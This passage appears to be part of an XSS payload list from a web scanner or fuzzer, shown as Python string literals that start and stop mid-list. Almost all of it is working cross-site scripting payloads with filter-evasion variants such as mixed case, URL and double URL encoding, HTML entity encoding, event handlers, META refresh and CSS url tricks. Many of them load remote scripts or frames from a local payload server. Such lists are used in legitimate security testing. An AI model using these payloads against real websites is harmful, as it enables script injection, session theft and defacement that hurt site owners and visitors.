             '</ScrIpt><script>prompt(1)</script>', '?/><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             '"><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             "'><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>', '?/><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '?/><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             '"><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             "'><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>', '</SCRIPT>?><SCRIPT>prompt(1)</SCRIPT>',
             '"></SCRIPT>?><SCRIPT>prompt(1)</SCRIPT>', "'></SCRIPT>?><SCRIPT>prompt(1)</SCRIPT>",
             '</SCRIPT>?><SCRIPT>alert(String.fromCharCode(75,67,70))',
             '"></SCRIPT>?><SCRIPT>alert(String.fromCharCode(75,67,70))',
             "'></SCRIPT>?><SCRIPT>alert(String.fromCharCode(75,67,70))", '</SCRIPT>?>?><SCRIPT>prompt(1)</SCRIPT>',
             '"></SCRIPT>?>?><SCRIPT>prompt(1)</SCRIPT>', "'></SCRIPT>?>?><SCRIPT>prompt(1)</SCRIPT>",
             '</SCRIPT>?>?><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>',
             '"></SCRIPT>?>?><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>',
             "'></SCRIPT>?>?><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>",
             '%27%3E%3C%73%63%72%69%70%74%3E%4B%43%46%3C%2F%73%63%72%69%70%74%3E',
             '%22%3E%3C%73%63%72%69%70%74%3E%4B%43%46%3C%2F%73%63%72%69%70%74%3E',
             '%25%32%37%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45%25%34%42%25%34%33%25%34%36%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45',
             '%25%32%32%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45%25%34%42%25%34%33%25%34%36%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45',
             '%25%32%35%25%33%32%25%33%32%25%32%35%25%33%33%25%34%35%25%32%35%25%33%33%25%34%33%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%37%25%33%30%25%32%35%25%33%37%25%33%34%25%32%35%25%33%33%25%34%35%25%32%35%25%33%34%25%34%32%25%32%35%25%33%34%25%33%33%25%32%35%25%33%34%25%33%36%25%32%35%25%33%33%25%34%33%25%32%35%25%33%32%25%34%36%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%32%25%32%35%25%33%36%25%33%39%25%32%35%25%33%37%25%33%30%25%32%35%25%33%37%25%33%34%25%32%35%25%33%33%25%34%35',
             '<h1>X</h1>', '"><h1>X</h1>', "'><h1>X</h1>", '<marquee>Kerala Cyber Force</marquee>',
             '"><marquee>Kerala Cyber Force</marquee>', "'><marquee>Kerala Cyber Force</marquee>",
             '<br><br><b><u>X</u></b>', '"><br><br><b><u>X</u></b>', "'><br><br><b><u>X</u></b>",
             '<script>window.open( "http://127.0.0.1:3555/xss_serve_payloads/X.html" )</script>',
             '</ScrIpt><script>window.open( "http://127.0.0.1:3555/xss_serve_payloads/X.html" )</script>',
             '"><script>window.open( "http://127.0.0.1:3555/xss_serve_payloads/X.html" )</script>',
             '</ScrIpt><script>window.open( "http://127.0.0.1:3555/xss_serve_payloads/X.html" )</script>',
             '\'><script>window.open( "http://127.0.0.1:3555/xss_serve_payloads/X.html" )</script>',
             '</ScrIpt><script>window.open( "http://127.0.0.1:3555/xss_serve_payloads/X.html" )</script>',
             '<script>alert%281%29</script>', '</ScrIpt><script>alert%281%29</script>',
             '"><script>alert%281%29</script>', '</ScrIpt><script>alert%281%29</script>',
             "'><script>alert%281%29</script>", '</ScrIpt><script>alert%281%29</script>', '<script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>/',
             '</ScrIpt><script>alert(1)</script>/', '"><script>alert(1)</script>/',
             '</ScrIpt><script>alert(1)</script>/', "'><script>alert(1)</script>/",
             '</ScrIpt><script>alert(1)</script>/', '<script%20language=vbscript>msgbox%20X</script>',
             '"><script%20language=vbscript>msgbox%20X</script>', "'><script%20language=vbscript>msgbox%20X</script>",
             '></title><script>alert(X)</script>\'"><marquee><h1>Kerala Cyber Force</h1></marquee>',
             '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '</ScrIpt><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '"><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '</ScrIpt><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '\'><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '</ScrIpt><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/X.js"></SCRIPT>',
             '<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '</ScrIpt><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '"><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '</ScrIpt><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '\'><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '</ScrIpt><SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp"></SCRIPT>',
             '?;!?<SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>=&{}',
             '!?<SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>=&{}', '<img src="blah"onmouseover="alert(1);">',
             '"><img src="blah"onmouseover="alert(1);">', '\'><img src="blah"onmouseover="alert(1);">',
             '<img src="blah>" onmouseover="alert(1);">', '"><img src="blah>" onmouseover="alert(1);">',
             '\'><img src="blah>" onmouseover="alert(1);">', '<IMG SRC="javascript:alert(1);"',
             '"><IMG SRC="javascript:alert(1);"', '\'><IMG SRC="javascript:alert(1);">',
             '"><IMG SRC="javascript:alert(1);"', '"><IMG SRC="javascript:alert(1);"',
             '\'><IMG SRC="javascript:alert(1);">', '\'><IMG SRC="javascript:alert(1);"',
             '"><IMG SRC="javascript:alert(1);"', '\'><IMG SRC="javascript:alert(1);">',
             '<IMG SRC="javascript:alert(1);"', '"><IMG SRC="javascript:alert(1);"',
             '\'><IMG SRC="javascript:alert(1);"', '<IMG SRC=javascript:alert(1)>', '"><IMG SRC=javascript:alert(1)>',
             "'><IMG SRC=javascript:alert(1)>", '<IMG SRC=JaVaScRiPt:alert(1)>', '"><IMG SRC=JaVaScRiPt:alert(1)>',
             "'><IMG SRC=JaVaScRiPt:alert(1)>", '</TITLE><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', '"><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', "'><SCRIPT>alert(1);</SCRIPT>",
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', '"></TITLE><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', '"><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', "'><SCRIPT>alert(1);</SCRIPT>",
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', "'></TITLE><SCRIPT>alert(1);</SCRIPT>",
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', '"><SCRIPT>alert(1);</SCRIPT>',
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', "'><SCRIPT>alert(1);</SCRIPT>",
             '</ScrIpt><SCRIPT>alert(1);</SCRIPT>', '<IMG SRC=javascript:alert(&quot;X&quot;)>',
             '"><IMG SRC=javascript:alert(&quot;X&quot;)>', "'><IMG SRC=javascript:alert(&quot;X&quot;)>",
             '<IMG SRC=`javascript:alert("Kerala Cyber Force, \'X\'")`>',
             '"><IMG SRC=`javascript:alert("Kerala Cyber Force, \'X\'")`>',
             '\'><IMG SRC=`javascript:alert("Kerala Cyber Force, \'X\'")`>', '<IMG """><SCRIPT>alert(1)</SCRIPT>">',
             '"><IMG """><SCRIPT>alert(1)</SCRIPT>">', '\'><IMG """><SCRIPT>alert(1)</SCRIPT>">',
             '<img/src="1"/onerror="alert(1)"', '"><img/src="1"/onerror="alert(1)"',
             '\'><img/src="1"/onerror="alert(1)"', 'SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>',
             '<IMG SRC=javascript:alert(String.fromCharCode(75,67,70))>',
             '"><IMG SRC=javascript:alert(String.fromCharCode(75,67,70))>',
             "'><IMG SRC=javascript:alert(String.fromCharCode(75,67,70))>", '<IMG SRC="jav\tascript:alert(1);">',
             '"><IMG SRC="jav\tascript:alert(1);">', '\'><IMG SRC="jav\tascript:alert(1);">',
             '<IMG SRC="jav&#x09;ascript:alert(1);">', '"><IMG SRC="jav&#x09;ascript:alert(1);">',
             '\'><IMG SRC="jav&#x09;ascript:alert(1);">', '<IMG SRC="jav&#x0A;ascript:alert(1);">',
             '"><IMG SRC="jav&#x0A;ascript:alert(1);">', '\'><IMG SRC="jav&#x0A;ascript:alert(1);">',
             '<IMG SRC="jav&#x0D;ascript:alert(1);">', '"><IMG SRC="jav&#x0D;ascript:alert(1);">',
             '\'><IMG SRC="jav&#x0D;ascript:alert(1);">', '<IMG SRC=" &#14;  javascript:alert(1);">',
             '"><IMG SRC=" &#14;  javascript:alert(1);">', '\'><IMG SRC=" &#14;  javascript:alert(1);">',
             '<script>prompt(1)</script>', '</ScrIpt><script>prompt(1)</script>', '"><script>prompt(1)</script>',
             '</ScrIpt><script>prompt(1)</script>', "'><script>prompt(1)</script>",
             '</ScrIpt><script>prompt(1)</script>', '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(1)>',
             '"><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(1)>', "'><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(1)>",
             '<body onload="alert(1);">', '"><body onload="alert(1);">', '\'><body onload="alert(1);">',
             '<body onload="alert(1)">', '"><body onload="alert(1)">', '\'><body onload="alert(1)">',
             '<img src="javascript:alert(1)">', '"><img src="javascript:alert(1)">',
             '\'><img src="javascript:alert(1)">', '<p style="background:url(\'javascript:alert(1)\')">',
             '"><p style="background:url(\'javascript:alert(1)\')">',
             '\'><p style="background:url(\'javascript:alert(1)\')">',
             '\' style=abc:expression(X) \' \\" style=abc:expression(X) \\"',
             '" type=image src=null onerror=X " \\\' type=image src=null onerror=X \\\'',
             'onload=\'X\' \\" onload=\\"X\\"/onload=\\"X\\"/onload=\'X\'/',
             '\\\'\\"<\\/script><\\/xml><\\/title><\\/textarea><\\/noscript><\\/style><\\/listing><\\/xmp><\\/pre><img src=null onerror=X>',
             '<<scr\\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js></script',
             '"><<scr\\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js></script',
             "'><<scr\\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/X.js></script",
             '<<scr\\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></script',
             '"><<scr\\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></script',
             "'><<scr\\0ipt/src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp></script",
             '<img src="x:gif" onerror="window[\'al\\u0065rt\'](1)"></img>',
             '"><img src="x:gif" onerror="window[\'al\\u0065rt\'](1)"></img>',
             '\'><img src="x:gif" onerror="window[\'al\\u0065rt\'](1)"></img>',
             '<img src="x:gif" onerror="eval(\'al\'%2b\'lert(1)\')">',
             '"><img src="x:gif" onerror="eval(\'al\'%2b\'lert(1)\')">',
             '\'><img src="x:gif" onerror="eval(\'al\'%2b\'lert(1)\')">',
             '<img src="x:alert" onerror="eval(src%2b\'(1)\')">', '"><img src="x:alert" onerror="eval(src%2b\'(1)\')">',
             '\'><img src="x:alert" onerror="eval(src%2b\'(1)\')">', '<img/src="mars.png"alt="mars">',
             '"><img/src="mars.png"alt="mars">', '\'><img/src="mars.png"alt="mars">',
             '<object data="javascript:alert(1)">', '"><object data="javascript:alert(1)">',
             '\'><object data="javascript:alert(1)">', '<isindex type=image src=1 onerror=alert(1)>',
             '"><isindex type=image src=1 onerror=alert(1)>', "'><isindex type=image src=1 onerror=alert(1)>",
             '<isindex action=javascript:alert(1) type=image>', '"><isindex action=javascript:alert(1) type=image>',
             "'><isindex action=javascript:alert(1) type=image>", '<img src=x:alert(alt) onerror=eval(src) alt=0>',
             '"><img src=x:alert(alt) onerror=eval(src) alt=0>', "'><img src=x:alert(alt) onerror=eval(src) alt=0>",
             '<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>',
             '"><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>',
             '\'><x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>',
             '<img src=foo.png onerror=%61%6C%65%72%74%28%2F%4B%43%46%2F%29/>',
             '"><img src=foo.png onerror=%61%6C%65%72%74%28%2F%4B%43%46%2F%29/>',
             "'><img src=foo.png onerror=%61%6C%65%72%74%28%2F%4B%43%46%2F%29/>", '";location=\'javascript:alert(1)\';',
             '";location=location.hash)//#0={};alert(1)', '";eval(unescape(location))//#%0Aalert(1)',
             '<b/alt="1"onmouseover=InputBox+1language=vbs>X</b>',
             '"><b/alt="1"onmouseover=InputBox+1language=vbs>X</b>',
             '\'><b/alt="1"onmouseover=InputBox+1language=vbs>X</b>', '<b "<script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>">X</b>', '</a onmousemove="alert(1)">',
             '"></a onmousemove="alert(1)">', '\'></a onmousemove="alert(1)">',
             'data:text/html,<script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>', '<img src="x:?" title="onerror=alert(1)//">',
             '"><img src="x:?" title="onerror=alert(1)//">', '\'><img src="x:?" title="onerror=alert(1)//">',
             '<img src="x:? title=" onerror=alert(1)//">', '"><img src="x:? title=" onerror=alert(1)//">',
             '\'><img src="x:? title=" onerror=alert(1)//">', '?script?alert(?X?)?/script?',
             '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">',
             '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==">',
             '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1);">',
             '"><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1);">',
             '\'><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1);">',
             '<DIV STYLE="background-image: url(javascript:alert(1))">',
             '"><DIV STYLE="background-image: url(javascript:alert(1))">',
             '\'><DIV STYLE="background-image: url(javascript:alert(1))">',
             '<div style="background-image: url(javascript:alert(1););">',
             '"><div style="background-image: url(javascript:alert(1););">',
             '\'><div style="background-image: url(javascript:alert(1););">',
             '<DIV STYLE="background-image: url(&#1;javascript:alert(1))">',
             '"><DIV STYLE="background-image: url(&#1;javascript:alert(1))">',
             '\'><DIV STYLE="background-image: url(&#1;javascript:alert(1))">',
             '<div style="behaviour: url(http://127.0.0.1:3555/xss_serve_payloads/X.html);">',
             '"><div style="behaviour: url(http://127.0.0.1:3555/xss_serve_payloads/X.html);">',
             '\'><div style="behaviour: url(http://127.0.0.1:3555/xss_serve_payloads/X.html);">',
             '<div style="binding: url(http://127.0.0.1:3555/xss_serve_payloads/X.html));">',
             '"><div style="binding: url(http://127.0.0.1:3555/xss_serve_payloads/X.html));">',
             '\'><div style="binding: url(http://127.0.0.1:3555/xss_serve_payloads/X.html));">',
             '<div style="behaviour: url(\'http://127.0.0.1:3555/xss_serve_payloads/X.html\');">',
             '"><div style="behaviour: url(\'http://127.0.0.1:3555/xss_serve_payloads/X.html\');">',
             '\'><div style="behaviour: url(\'http://127.0.0.1:3555/xss_serve_payloads/X.html\');">',
             '<div style="binding: url("http://127.0.0.1:3555/xss_serve_payloads/X.html"));">',
             '"><div style="binding: url("http://127.0.0.1:3555/xss_serve_payloads/X.html"));">',
             '\'><div style="binding: url("http://127.0.0.1:3555/xss_serve_payloads/X.html"));">',
             '<SCRIPT <B>alert(1);</SCRIPT>', '"><SCRIPT <B>alert(1);</SCRIPT>', "'><SCRIPT <B>alert(1);</SCRIPT>",
             '<<SCRIPT>alert(1);/', '"><<SCRIPT>alert(1);/', "'><<SCRIPT>alert(1);//<</SCRIPT>",
             '"><<SCRIPT>alert(1);//<</SCRIPT>', "'><<SCRIPT>alert(1);//<</SCRIPT>", '<<script>alert(1);</script>',
             '"><<script>alert(1);</script>', "'><<script>alert(1);</script>", '</ScrIpt><script>alert(1);</script>',
             '"><script>alert(1);</script>', '</ScrIpt><script>alert(1);</script>', "'><script>alert(1);</script>",
             '</ScrIpt><script>alert(1);</script>', '<INPUT TYPE="IMAGE" SRC="javascript:alert(1);">',
             '"><INPUT TYPE="IMAGE" SRC="javascript:alert(1);">', '\'><INPUT TYPE="IMAGE" SRC="javascript:alert(1);">',
             '<IMG SRC="javascript:alert(1)"', '"><IMG SRC="javascript:alert(1)"', '\'><IMG SRC="javascript:alert(1)"',
             '<iframe src=http://127.0.0.1:3555/xss_serve_payloads/X.html <',
             '"><iframe src=http://127.0.0.1:3555/xss_serve_payloads/X.html <',
             "'><iframe src=http://127.0.0.1:3555/xss_serve_payloads/X.html <", '<SCRIPT>a=/X/',
             '</ScrIpt><SCRIPT>a=/X/', '"><SCRIPT>a=/X/', '</ScrIpt><SCRIPT>a=/X/', "'><SCRIPT>a=/X/",
             '</ScrIpt><SCRIPT>a=/X/alert(a.source)</SCRIPT>', '</ScrIpt><SCRIPT>a=/X/alert(a.source)</SCRIPT>',
             '"><SCRIPT>a=/X/alert(a.source)</SCRIPT>', '</ScrIpt><SCRIPT>a=/X/alert(a.source)</SCRIPT>',
             "'><SCRIPT>a=/X/alert(a.source)</SCRIPT>", '</ScrIpt><SCRIPT>a=/X/alert(a.source)</SCRIPT>',
             '\\";alert(1);//', '<input onfocus=javascript:alert(1) autofocus>',
             '"><input onfocus=javascript:alert(1) autofocus>', "'><input onfocus=javascript:alert(1) autofocus>",
             '<select onfocus=javascript:alert(1) autofocus>', '"><select onfocus=javascript:alert(1) autofocus>',
             "'><select onfocus=javascript:alert(1) autofocus>", '<textarea onfocus=javascript:alert(1) autofocus>',
             '"><textarea onfocus=javascript:alert(1) autofocus>', "'><textarea onfocus=javascript:alert(1) autofocus>",
             '<keygen onfocus=javascript:alert(1) autofocus>', '"><keygen onfocus=javascript:alert(1) autofocus>',
             "'><keygen onfocus=javascript:alert(1) autofocus>", '<input autofocus onfocus=alert(1)>',
             '"><input autofocus onfocus=alert(1)>', "'><input autofocus onfocus=alert(1)>",
             '<iframe/ /onload=alert(1)></iframe>', '"><iframe/ /onload=alert(1)></iframe>',
             "'><iframe/ /onload=alert(1)></iframe>", '<iframe/ "onload=alert(1)></iframe>',
             '"><iframe/ "onload=alert(1)></iframe>', '\'><iframe/ "onload=alert(1)></iframe>',
             '<iframe///////onload=alert(1)></iframe>', '"><iframe///////onload=alert(1)></iframe>',
             "'><iframe///////onload=alert(1)></iframe>", '<iframe "onload=alert(1)></iframe>',
             '"><iframe "onload=alert(1)></iframe>', '\'><iframe "onload=alert(1)></iframe>',
             '<iframe<?php echo chr(11)?> onload=alert(1)></iframe>',
             '"><iframe<?php echo chr(11)?> onload=alert(1)></iframe>',
             "'><iframe<?php echo chr(11)?> onload=alert(1)></iframe>",
             '<iframe<?php echo chr(12)?> onload=alert(1)></iframe>',
             '"><iframe<?php echo chr(12)?> onload=alert(1)></iframe>',
             "'><iframe<?php echo chr(12)?> onload=alert(1)></iframe>",
             '<ScRIPT x src=//0x.lv?</style></script><script>alert(String.fromCharCode(75,67,70))</script>',
             '"></script><script>alert(String.fromCharCode(75,67,70))</script>',
             "'></script><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             '"><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             "'><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script><script src=http://127.0.0.1:3555/xss_serve_payloads/X.js>',
             '<ScRIPT x src=//0x.lv?</style></script><script>alert(String.fromCharCode(75,67,70))</script>',
             '"></script><script>alert(String.fromCharCode(75,67,70))</script>',
             "'></script><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             '"><script>alert(String.fromCharCode(75,67,70))</script>',
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script>',
             "'><script>alert(String.fromCharCode(75,67,70))</script>",
             '</ScrIpt><script>alert(String.fromCharCode(75,67,70))</script><script src=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp>',
             '</script><script>alert(X', '"></script><script>alert(X', "'></script><script>alert(X",
             '%7D%3C/style%3E43%27%22%3E%3C/title%3E%3Cscript%3Ea=eval;b=alert;a(b(/X/.source));%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EX%3C/h1%3E%3C/marquee%3E',
             '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#75;&#67;&#70;&#34;&#41;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;',
             '<FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>',
             '"><FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>',
             '\'><FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>', "')alert(1);", '");alert(1);',
             '?;alert(?X?);?', '?;alert(String.fromCharCode(75,67,70));?', '?;alert(?X?);?',
             '?;alert(String.fromCharCode(75,67,70));?', '?;alert(?X?)', '?;alert(String.fromCharCode(75,67,70))',
             '?;alert(?X?)', '?;alert(String.fromCharCode(75,67,70))', '<script>var var = 1; alert(var)</script>',
             '</ScrIpt><script>var var = 1; alert(var)</script>', '"><script>var var = 1; alert(var)</script>',
             '</ScrIpt><script>var var = 1; alert(var)</script>', "'><script>var var = 1; alert(var)</script>",
             '</ScrIpt><script>var var = 1; alert(var)</script>', '<script type=text/javascript>alert(1)</script>',
             '"><script type=text/javascript>alert(1)</script>', "'><script type=text/javascript>alert(1)</script>",
             '?><script >alert(1)</script>',
             '<iframe src="http://127.0.0.1:3555/xss_serve_payloads/X.html" width="800" height="800">iframe</iframe>',
             '"><iframe src="http://127.0.0.1:3555/xss_serve_payloads/X.html" width="800" height="800">iframe</iframe>',
             '\'><iframe src="http://127.0.0.1:3555/xss_serve_payloads/X.html" width="800" height="800">iframe</iframe>',
             '<IMG SRC=`javascript:alert(?X says, ?X??)`>', '"><IMG SRC=`javascript:alert(?X says, ?X??)`>',
             "'><IMG SRC=`javascript:alert(?X says, ?X??)`>",
             '<img src = ?http://127.0.0.1:3555/xss_serve_payloads/X.js?>',
             '"><img src = ?http://127.0.0.1:3555/xss_serve_payloads/X.js?>',
             "'><img src = ?http://127.0.0.1:3555/xss_serve_payloads/X.js?>",
             '<img src = ?http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp?>',
             '"><img src = ?http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp?>',
             "'><img src = ?http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp?>",
             '<A HREF="//127.0.0.1:3555/xss_serve_payloads/X.html">X</A>',
             '"><A HREF="//127.0.0.1:3555/xss_serve_payloads/X.html">X</A>',
             '\'><A HREF="//127.0.0.1:3555/xss_serve_payloads/X.html">X</A>',
             '<A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html./">X</A>',
             '"><A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html./">X</A>',
             '\'><A HREF="http://127.0.0.1:3555/xss_serve_payloads/X.html./">X</A>',
             '<A HREF="javascript:document.location=\'http://127.0.0.1:3555/xss_serve_payloads/X.html\'">X</A>',
             '"><A HREF="javascript:document.location=\'http://127.0.0.1:3555/xss_serve_payloads/X.html\'">X</A>',
             '\'><A HREF="javascript:document.location=\'http://127.0.0.1:3555/xss_serve_payloads/X.html\'">X</A>',
             '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#75;&#67;&#70;&#39;&#41;&#59;>',
             '"><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#75;&#67;&#70;&#39;&#41;&#59;>',
             "'><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#75;&#67;&#70;&#39;&#41;&#59;>",
             '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
             '"><IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
             "'><IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
             '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
             '"><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
             "'><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
             '<DIV STYLE="background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029">',
             '"><DIV STYLE="background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029">',
